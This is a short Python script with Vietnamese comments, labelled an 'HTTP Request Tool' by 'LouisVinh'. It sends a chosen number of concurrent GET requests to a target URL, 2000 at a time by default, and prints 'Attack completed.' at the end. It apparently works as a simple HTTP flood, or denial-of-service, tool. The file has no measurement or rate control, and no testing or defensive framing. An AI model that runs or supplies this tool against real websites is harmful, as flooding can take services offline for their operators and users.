import asyncio
import aiohttp
import argparse

# Mã màu ANSI cho đầu ra terminal
PURPLE = "\033[95m"
CYAN = "\033[96m"
GREEN = "\033[92m"
RESET = "\033[0m"

async def send_request(session, url, semaphore):
    async with semaphore:
        try:
            async with session.get(url) as response:
                print(f"{PURPLE}</>LouisTimsNet | status: {response.status}{RESET}|")
        except Exception as e:
            print(f"{CYAN}Request failed: {e}{RESET}")

async def main(url, requests_count, max_concurrent_requests):
    print(f"{PURPLE}© 2024 - HTTP Request Tool by LouisVinh 0.1{RESET}")
    semaphore = asyncio.Semaphore(max_concurrent_requests)
    async with aiohttp.ClientSession() as session:
        tasks = [send_request(session, url, semaphore) for _ in range(requests_count)]
        await asyncio.gather(*tasks)
    print(f"{PURPLE}Attack completed.{RESET}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Gửi yêu cầu liên tục đến URL.")
    parser.add_argument("url", type=str, help="URL cần gửi yêu cầu")
    parser.add_argument("requests_count", type=int, help="Số lượng yêu cầu muốn gửi")
    parser.add_argument("--max_concurrent_requests", type=int, default=2000, help="Số lượng yêu cầu tối đa chạy đồng thời")
    args = parser.parse_args()

    asyncio.run(main(args.url, args.requests_count, args.max_concurrent_requests))